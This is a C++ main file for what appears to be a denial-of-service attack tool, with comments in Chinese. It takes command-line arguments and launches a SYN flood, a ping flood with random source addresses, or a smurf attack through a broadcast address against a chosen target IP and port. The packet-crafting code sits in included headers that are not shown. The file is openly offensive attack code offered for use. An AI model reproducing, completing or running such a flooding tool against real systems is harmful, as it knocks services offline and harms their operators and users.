#include <iostream>
#include <string>

#include "clipp.h"
#include "icmp_attack.h"
#include "ip_pack.h"
#include "syn_attack.h"

using namespace std;
using namespace clipp;

// 攻击方式
enum class mode { syn_flood, ping_flood, smurf, help };

// 默认攻击方式
mode selected = mode::syn_flood;

// 攻击信息
string ip, broadcast;
int port;

int main(int argc, char *argv[]) {
    auto synMode = (command("syn", "syn_flood").set(selected, mode::syn_flood),
                    required("-ip") & value("ip address", ip),
                    required("-p", "-port") & value("port", port));

    auto pingMode =
        (command("ping", "ping_flood").set(selected, mode::ping_flood),
         required("-ip") & value("ip address", ip));

    auto smurfMode =
        (command("smurf", "smurf_attack").set(selected, mode::smurf),
         required("-ip") & value("ip address", ip),
         required("-b", "-broadcast") & value("broadcast address", broadcast));

    auto cli = ((synMode | pingMode | smurfMode |
                 command("help").set(selected, mode::help)));

    if (parse(argc, argv, cli)) { // 读取命令行参数
        IP_PACK ip_pack_icmp(IPPROTO_ICMP);
        ICMP_Attack icmp_attack(ip_pack_icmp);

        IP_PACK ip_pack_tcp(IPPROTO_TCP);
        SYN_Attack tcp_attack(ip_pack_tcp);

        switch (selected) {
            case mode::syn_flood:
                cout << "SYN flood on " << ip << ":" << port << endl;

                tcp_attack.start((char *)ip.c_str(), port);

                break;
            case mode::ping_flood:
                cout << "Ping flood on " << ip << endl;

                icmp_attack.start_rand_source((char *)ip.c_str());

                break;
            case mode::smurf:
                cout << "smurf Attack on " << ip << " by ping " << broadcast
                     << endl;

                icmp_attack.start((char *)ip.c_str(),
                                  (char *)broadcast.c_str());

                break;
            case mode::help:
                cout << make_man_page(cli, "DOS");
                break;
        }
    } else {
        cout << usage_lines(cli, "DOS") << '\n';
    }

    return 0;
}